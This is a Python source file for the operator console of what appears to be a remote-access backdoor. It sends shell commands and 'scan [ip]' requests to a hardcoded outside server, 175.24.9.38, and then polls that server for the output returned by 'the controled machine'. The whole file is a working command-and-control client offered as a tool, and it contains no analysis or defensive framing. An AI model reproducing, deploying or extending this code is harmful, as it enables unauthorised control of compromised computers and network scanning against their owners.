from requests import get, post
from time import sleep
from os import system as sys

url = "http://175.24.9.38:9912/XccO0aZ1230610086"

postdata = {"cmd":""}

def helpmessage():
    print("+----------------------------------------+")
    print("|             Remote control             |")
    print("|                V0.0.1                  |")
    print("+----------------------------------------+")
    print("| alert:The lenth of shell cmd must be   |")
    print("|       less than 20.                    |")
    print("|       Shell only allow ascii character.|")
    print("+----------------------------------------+")
    print("|[scan] usage:                           |")
    print("|       scan [ip]                        |")
    print("|       e.g. scan 127.0.0.1              |")
    print("|clear: To clean the screen.(in Linux)   |")
    print("|cls: To clean the screen.(in Windows)   |")
    print("+----------------------------------------+")

if __name__ == '__main__':
    sleep_time = 1*7*2
    last_result = ""
    result = ""
    print("type \"help\" to show help message")
    while True:
        cmd = input("Shell>> ")
        if cmd == "help":
            helpmessage()
        elif cmd == "clear":
            sys("clear")
        elif cmd == "cls":
            sys("cls")
        else:
            postdata["cmd"] = cmd
            temp = post(url, data=postdata)
            print(temp.text)
            if "scan" in cmd:
                print("Scan will take at least 100S.\nPlease waiting for more than 2min to get the result.")
                sleep(101)
            sleep(sleep_time)
            result = get(url)
            if result.text == "":
                print("Receved null string, if the except result isn't null,\nyou can try to run the same shell again.")
            elif result.text == last_result:
                print("The result is equal to the last result.")
                print("If you typed a different cmd,\nthe controled machine might apeared some problems,\nplease waiting for 20S for next cmd")
            else:
                print("Result:\n" + result.text)
                last_result = result.text
